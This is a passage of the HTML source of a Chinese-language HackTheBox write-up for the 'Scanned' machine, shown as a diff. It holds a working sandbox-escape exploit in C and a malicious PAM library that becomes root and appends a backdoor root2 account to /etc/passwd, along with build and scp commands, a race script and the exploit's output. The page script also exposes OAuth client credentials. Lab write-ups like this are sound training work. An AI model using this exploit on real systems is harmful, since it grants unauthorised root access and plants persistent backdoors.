class="string">&quot;Stage 2 - currently running in killer&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> <span class="type">int</span> fd = <span class="number">3</span>;</span><br><span class="line">    <span class="type">int</span> cwd = open(<span class="string">&quot;.&quot;</span>, O_RDONLY | O_DIRECTORY);</span><br><span class="line">    <span class="type">int</span> status;</span><br><span class="line"></span><br><span class="line">    status = fchdir(fd);</span><br><span class="line">    <span class="keyword">if</span> (status != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;fchdir() = %d\n&quot;</span>, errno);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    status = chdir(<span class="string">&quot;../../../../../../../../../../&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (status != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;chdir() = %d\n&quot;</span>, errno);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span>* args[] = &#123;<span class="string">&quot;bin/su&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">    execve(<span class="string">&quot;bin/su&quot;</span>, args, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Failed to su&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">inject</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> program[] = <span class="string">&quot;/userprog&quot;</span>;</span><br><span class="line">    <span class="type">char</span>* arg[<span class="number">3</span>] = &#123;program, <span class="string">&quot;2&quot;</span>, <span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;movq $59, %%rax; movq %0, %%rdi; movq %1, %%rsi; xor %%rdx, %%rdx; syscall;&quot;</span></span><br><span class="line">        :</span><br><span class="line">        : <span class="string">&quot;r&quot;</span>(program), <span class="string">&quot;r&quot;</span>(arg)</span><br><span class="line">        : <span class="string">&quot;rax&quot;</span>, <span class="string">&quot;rdi&quot;</span>, <span class="string">&quot;rsi&quot;</span>, <span class="string">&quot;rdx&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">guard</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (argc &lt; <span class="number">2</span>) &#123;</span><br><span class="line">        do_stage_1();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        do_stage_2();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>以及新的惡意 library：</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// `libpam_misc.so.0` is expected to define this symbol</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">misc_conv</span><span class="params">()</span> &#123; <span class="keyword">return</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __attribute__((constructor)) <span class="type">void</span> <span class="title function_">init</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello from constructor, I am %d:%d (%d:%d)\n&quot;</span>, getuid(), geteuid(), getgid(), getegid());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Make ourselves root proper</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;SEUID %d %d\n&quot;</span>, seteuid(<span class="number">0</span>), errno);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;SUID %d %d\n&quot;</span>, setuid(<span class="number">0</span>), errno);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Restore the true system root</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Chroot %d %d\n&quot;</span>, chroot(<span class="string">&quot;../../../../../../&quot;</span>), errno);</span><br><span class="line">    chdir(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Add a new record to /etc/passwd (password: suidroot)</span></span><br><span class="line">    <span class="type">char</span> *args[] = &#123;</span><br><span class="line">        <span class="string">&quot;/bin/sh&quot;</span>, </span><br><span class="line">        <span class="string">&quot;-p&quot;</span>, </span><br><span class="line">        <span class="string">&quot;-c&quot;</span>, </span><br><span class="line">        <span class="string">&quot;echo &#x27;root2:YiY4/N2td230w:0:0:root:/root:/bin/bash&#x27; &gt;&gt; /etc/passwd&quot;</span>, </span><br><span class="line">        <span class="literal">NULL</span></span><br><span class="line">    &#125;;</span><br><span class="line">    execve(<span class="string">&quot;/bin/sh&quot;</span>, args, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Execve failed&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>編譯完透過 scp 丟到 remote server。</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">musl-gcc main.c -fPIC -static -fno-stack-protector -o exploit</span><br><span class="line">gcc -shared -fPIC -o evil.so mal_lib.c</span><br><span class="line">scp exploit evil.so clarence@10.129.237.62:/tmp</span><br></pre></td></tr></table></figure></div>
+<p>接著我們在 &#x2F;tmp 下面寫一個腳本把這兩個 processess 綁在一起：</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">FOLDER=$(pwgen 10 1)</span><br><span class="line"><span class="built_in">mkdir</span> <span class="string">&quot;<span class="variable">$FOLDER</span>&quot;</span></span><br><span class="line"><span class="built_in">cp</span> exploit evil.so <span class="string">&quot;<span class="variable">$FOLDER</span>&quot;</span></span><br><span class="line"><span class="built_in">cd</span> <span class="string">&quot;<span class="variable">$FOLDER</span>&quot;</span> || <span class="built_in">exit</span></span><br><span class="line"><span class="built_in">mkdir</span> -p jails/a/usr/lib/x86_64-linux-gnu/</span><br><span class="line">/var/www/malscanner/sandbox/sandbox <span class="string">&quot;<span class="subst">$(pwd)</span>/exploit&quot;</span> a &amp;</span><br><span class="line"><span class="built_in">sleep</span> 0.1</span><br><span class="line"><span class="built_in">cp</span> /usr/lib/x86_64-linux-gnu/&#123;libutil.so.1,libpam.so.0,libaudit.so.1,libcap-ng.so.0,libdl.so.2,libpthread.so.0&#125; jails/a/usr/lib/x86_64-linux-gnu/</span><br><span class="line"><span class="built_in">cp</span> evil.so jails/a/usr/lib/x86_64-linux-gnu/libpam_misc.so.0</span><br><span class="line"><span class="built_in">chmod</span> +x jails/a/usr/lib/x86_64-linux-gnu/</span><br></pre></td></tr></table></figure></div>
+<p>然後給他執行權限後跑起來就可以看到以下畫面：</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">clarence@scanned:/tmp$ ./exploit.sh </span><br><span class="line">Child is 2</span><br><span class="line">[*] Attached</span><br><span class="line">[*] Got regs</span><br><span class="line">[*] Wrote data</span><br><span class="line">[*] Detached!</span><br><span class="line">clarence@scanned:/tmp$ Stage 2 - currently running <span class="keyword">in</span> killer</span><br><span class="line">Exited</span><br><span class="line">bin/su: /lib/x86_64-linux-gnu/libpam_misc.so.0: no version information available (required by bin/su)</span><br><span class="line">Hello from constructor, I am 1001:0 (1001:1001)</span><br><span class="line">SEUID 0 0</span><br><span class="line">SUID 0 0</span><br><span class="line">Chroot 0 0</span><br></pre></td></tr></table></figure></div>
+<p>然後看 <code>/etc/passwd</code> 就可以看到 root2 被寫到裡面了，接著我們就可以用密碼 <code>suidroot</code> 來執行 su root2。</p>
+<h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned!!!"></a>Pwned!!!</h4><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/scanned_pwn.png"
+                      alt="pwn"
+                ></p>
+
+        </div>
+
+        
+            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> HackTheBox-Machines Scanned Writeup</li>
+        <li><strong>Author:</strong> kazma</li>
+        <li><strong>Created at
+                :</strong> 2024-11-15 16:35:09</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2024-11-15 20:37:28
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://kazma.tw/2024/11/15/HackTheBox-Machines-Scanned-Writeup/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/htb/">#htb</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/machines/">#machines</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/writeup/">#writeup</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/pt/">#pt</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/sandbox-escape/">#sandbox escape</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2024/11/11/Pwn-CTF-pivotquest-Writeup/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Pwn CTF pivotquest Writeup</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+            <div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+                <div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        Comments
+    </div>
+    
+
+        
+            
+    <div id="gitalk-container"></div>
+    <script data-swup-reload-script
+            src="//cdn.staticfile.org/gitalk/1.8.0/gitalk.min.js"></script>
+    <script data-swup-reload-script>
+
+        function loadGitalk() {
+            let __gitalk__pathname = decodeURI(location.pathname);
+            const __gitalk__pathnameLength = __gitalk__pathname.length;
+            const __gitalk__pathnameMaxLength = 50;
+            if (__gitalk__pathnameLength > __gitalk__pathnameMaxLength) {
+                __gitalk__pathname = __gitalk__pathname.substring(0, __gitalk__pathnameMaxLength - 3) + '...';
+            }
+
+            try {
+                Gitalk && new Gitalk({
+                    clientID: '68fd7e0e6c37358fbb4f',
+                    clientSecret: 'dc6a9d6490a92521e96b38717770845226846c62',
+                    repo: 'kazmatw.github.io',
+                    owner: 'kazmatw',
+                    admin: ['kazmatw'],
+                    id: __gitalk__pathname,
+                    language: 'en',
+                    proxy: 'https://github.com/login/oauth/access_token'
+                }).render('gitalk-container');
+
+            } catch (e) {
+                window.Gitalk = null;
+            }
+        }
+
+        if ('true') {
+            const loadGitalkTimeout = setTimeout(() => {
+                loadGitalk();
+                clearTimeout(loadGitalkTimeout);
+            }, 1000);
+        } else {
+            window.addEventListener('DOMContentLoaded', loadGitalk);
+        }
+    </script>
+
+
+
+        
+    
+</div>
+
+            </div>
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">HackTheBox-Machines Scanned Writeup</div>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Scanned"><span class="nav-text">Scanned</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Recon"><span class="nav-text">Recon</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploit"><span class="nav-text">Exploit</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Privilege-Escalation"><span class="nav-text">Privilege Escalation</span></a></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">kazma</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        109 posts in total
+                    </span>
+                    
+                </p>
+            
+        </div>
+        
+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.6.4</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fa-regular fa-comments"></i>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+            <li class="right-bottom-tools rss flex justify-center items-center">
+                <a class="flex justify-center items-center"
+                   href="/atom.xml"
+                   target="_blank"
+                >
+                <i class="fa-regular fa-rss"></i>
+                </a>
+            </li>
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fa-solid fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fa-solid fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+    
+<script src="/js/tools/localSearch.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
